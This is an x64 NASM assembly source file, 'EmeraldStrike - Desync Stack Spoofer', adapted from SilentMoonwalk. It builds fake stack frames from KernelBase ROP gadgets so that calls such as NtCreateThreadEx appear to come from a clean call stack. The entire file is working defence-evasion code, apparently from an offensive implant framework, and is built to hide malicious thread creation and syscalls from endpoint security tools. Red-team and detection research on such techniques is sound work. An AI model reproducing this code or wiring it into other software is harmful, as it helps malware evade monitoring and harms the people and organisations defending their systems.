;   ------------------------------------------------------------------------------------
;   EmeraldStrike - Desync Stack Spoofer (NASM, x64)
;   Based on SilentMoonwalk by KlezVirus / Waldo-IRC / Trickster0
;
;   Uses ROP gadgets in KernelBase to desynchronize stack unwinding from
;   actual control flow. Provides clean callstack for hooked syscall dispatch.
;
;   Extended to support up to 11 arguments (NtCreateThreadEx).
;   PIC-safe: only uses struct offsets and relative addressing.
;   ------------------------------------------------------------------------------------

section .text
default rel

global desync_spoof_call

; ------------------------------------------------------------------------------------
; DESYNC_SPOOFER struct offsets - must match callstack_spoof.h exactly
; ------------------------------------------------------------------------------------
%define S_KernelBaseAddress              0x00
%define S_KernelBaseAddressEnd           0x08
%define S_RtlUserThreadStartAddress      0x10
%define S_BaseThreadInitThunkAddress     0x18
%define S_FirstFrameFunctionPointer      0x20
%define S_SecondFrameFunctionPointer     0x28
%define S_JmpRbxGadget                   0x30
%define S_AddRspXGadget                  0x38
%define S_FirstFrameSize                 0x40
%define S_FirstFrameRandomOffset         0x48
%define S_SecondFrameSize                0x50
%define S_SecondFrameRandomOffset        0x58
%define S_JmpRbxGadgetFrameSize          0x60
%define S_AddRspXGadgetFrameSize         0x68
%define S_RtlUserThreadStartFrameSize    0x70
%define S_AddRspImmediate                0x78
%define S_StackOffsetWhereRbpIsPushed    0x80
%define S_JmpRbxGadgetRef                0x88
%define S_SpoofFunctionPointer           0x90
%define S_ReturnAddress                  0x98
%define S_Nargs                          0xA0
%define S_Arg01                          0xA8
%define S_Arg02                          0xB0
%define S_Arg03                          0xB8
%define S_Arg04                          0xC0
%define S_Arg05                          0xC8
%define S_Arg06                          0xD0
%define S_Arg07                          0xD8
%define S_Arg08                          0xE0
%define S_Arg09                          0xE8
%define S_Arg10                          0xF0
%define S_Arg11                          0xF8

; ============================================================================
; desync_spoof_call(PDESYNC_SPOOFER pConfig)
;   rcx = pointer to DESYNC_SPOOFER struct
;
; Flow:
;   1. Save nonvol regs (rbp, rbx)
;   2. Create JmpRbxGadgetRef on stack
;   3. Anchor rbp = original rsp
;   4. Push restore address, rbx → points to it
;   5. Build fake frames: FirstFrame, SecondFrame (with RBP plant), ROP gadgets
;   6. Load args from struct → registers + stack
;   7. jmp target function
;   8. Target returns → ADD RSP,X → JMP [RBX] → restore → back to caller
; ============================================================================

desync_spoof_call:
    ; -------------------------------------------------------------------
    ; Save non-volatile registers on the caller's stack
    ; -------------------------------------------------------------------
    mov     [rsp+08h], rbp
    mov     [rsp+10h], rbx

    ; -------------------------------------------------------------------
    ; Save return address (address of RA on stack) into struct
    ; -------------------------------------------------------------------
    mov     [rcx + S_ReturnAddress], rsp

    ; -------------------------------------------------------------------
    ; Create a stack reference to the JMP [RBX] gadget address
    ; -------------------------------------------------------------------
    mov     rbx, [rcx + S_JmpRbxGadget]
    mov     [rsp+18h], rbx
    lea     rbx, [rsp+18h]
    mov     [rcx + S_JmpRbxGadgetRef], rbx

    ; -------------------------------------------------------------------
    ; Prolog: RBP anchors original stack, RSP will be desynced
    ; -------------------------------------------------------------------
    mov     rbp, rsp

    ; -------------------------------------------------------------------
    ; Push address of restore routine → rbx will point to it
    ; When JMP [RBX] fires, it redirects here to clean up
    ; -------------------------------------------------------------------
    lea     rax, [rel .restore]
    push    rax
    lea     rbx, [rsp]

    ; -------------------------------------------------------------------
    ; First Frame - fake origin function from KernelBase
    ; Push function pointer + random offset (looks like mid-function RA)
    ; -------------------------------------------------------------------
    push    qword [rcx + S_FirstFrameFunctionPointer]
    mov     rax, [rcx + S_FirstFrameRandomOffset]
    add     qword [rsp], rax

    ; Calculate fake RBP value that links back through first frame
    mov     rax, [rcx + S_ReturnAddress]
    sub     rax, [rcx + S_FirstFrameSize]

    ; -------------------------------------------------------------------
    ; Second Frame - function that unwinds via POP RBP
    ; Allocate frame space and plant the fake RBP link
    ; -------------------------------------------------------------------
    sub     rsp, [rcx + S_SecondFrameSize]
    mov     r10, [rcx + S_StackOffsetWhereRbpIsPushed]
    mov     [rsp + r10], rax

    push    qword [rcx + S_SecondFrameFunctionPointer]
    mov     rax, [rcx + S_SecondFrameRandomOffset]
    add     qword [rsp], rax

    ; -------------------------------------------------------------------
    ; ROP Frame 1: JMP [RBX] gadget frame
    ; After ADD RSP,X pops past the gadget frames, the unwinder sees
    ; JmpRbxGadgetRef as the "return address" → calls restore
    ; -------------------------------------------------------------------
    sub     rsp, [rcx + S_JmpRbxGadgetFrameSize]
    push    qword [rcx + S_JmpRbxGadgetRef]

    ; -------------------------------------------------------------------
    ; ROP Frame 2: ADD RSP, X gadget frame
    ; This frame contains the ADD RSP + RET gadget as "return address"
    ; JMP gadget address is stored at the offset matching the ADD imm
    ; -------------------------------------------------------------------
    sub     rsp, [rcx + S_AddRspXGadgetFrameSize]

    ; Store JMP [RBX] gadget at [rsp + IMM] where IMM is the actual
    ; ADD RSP immediate found at runtime. After the target returns,
    ; the ADD RSP gadget pivots RSP up, and the following RET pops
    ; this value - redirecting to JMP [RBX] → .restore.
    mov     r10, [rcx + S_JmpRbxGadget]
    mov     r11, rsp
    add     r11, [rcx + S_AddRspImmediate]
    mov     [r11], r10

    ; -------------------------------------------------------------------
    ; Push the ADD RSP, X gadget as the "return address" for the target
    ; -------------------------------------------------------------------
    push    qword [rcx + S_AddRspXGadget]

    ; Store AddRspXGadgetFrameSize at [rbp+28h] for frame accounting
    mov     rax, [rcx + S_AddRspXGadgetFrameSize]
    mov     [rbp + 28h], rax

    ; -------------------------------------------------------------------
    ; Load target function pointer into RAX
    ; -------------------------------------------------------------------
    mov     rax, [rcx + S_SpoofFunctionPointer]

    ; -------------------------------------------------------------------
    ; Parameter handler - load args from struct into registers + stack
    ; Uses fall-through logic: highest arg count jumps to handler,
    ; which falls through to lower arg handlers
    ; -------------------------------------------------------------------
    cmp     qword [rcx + S_Nargs], 11
    je      .handle_eleven
    cmp     qword [rcx + S_Nargs], 10
    je      .handle_ten
    cmp     qword [rcx + S_Nargs], 9
    je      .handle_nine
    cmp     qword [rcx + S_Nargs], 8
    je      .handle_eight
    cmp     qword [rcx + S_Nargs], 7
    je      .handle_seven
    cmp     qword [rcx + S_Nargs], 6
    je      .handle_six
    cmp     qword [rcx + S_Nargs], 5
    je      .handle_five
    cmp     qword [rcx + S_Nargs], 4
    je      .handle_four
    cmp     qword [rcx + S_Nargs], 3
    je      .handle_three
    cmp     qword [rcx + S_Nargs], 2
    je      .handle_two
    cmp     qword [rcx + S_Nargs], 1
    je      .handle_one
    jmp     .execute

; Stack args (5+): use push/mov/pop pattern to avoid clobbering registers

.handle_eleven:
    push    r15
    mov     r15, [rcx + S_Arg11]
    mov     [rsp + 60h], r15
    pop     r15
    jmp     .handle_ten

.handle_ten:
    push    r15
    mov     r15, [rcx + S_Arg10]
    mov     [rsp + 58h], r15
    pop     r15
    jmp     .handle_nine

.handle_nine:
    push    r15
    mov     r15, [rcx + S_Arg09]
    mov     [rsp + 50h], r15
    pop     r15
    jmp     .handle_eight

.handle_eight:
    push    r15
    mov     r15, [rcx + S_Arg08]
    mov     [rsp + 48h], r15
    pop     r15
    jmp     .handle_seven

.handle_seven:
    push    r15
    mov     r15, [rcx + S_Arg07]
    mov     [rsp + 40h], r15
    pop     r15
    jmp     .handle_six

.handle_six:
    push    r15
    mov     r15, [rcx + S_Arg06]
    mov     [rsp + 38h], r15
    pop     r15
    jmp     .handle_five

.handle_five:
    push    r15
    mov     r15, [rcx + S_Arg05]
    mov     [rsp + 30h], r15
    pop     r15
    jmp     .handle_four

.handle_four:
    mov     r9, [rcx + S_Arg04]
    jmp     .handle_three

.handle_three:
    mov     r8, [rcx + S_Arg03]
    jmp     .handle_two

.handle_two:
    mov     rdx, [rcx + S_Arg02]
    jmp     .handle_one

.handle_one:
    mov     rcx, [rcx + S_Arg01]
    ; fall through to execute

.execute:
    jmp     rax

; ============================================================================
; restore - called via JMP [RBX] after the ROP chain fires
; Restores original stack and non-volatile registers, returns to caller
; ============================================================================
.restore:
    mov     rsp, rbp
    mov     rbp, [rsp + 08h]
    mov     rbx, [rsp + 10h]
    ret
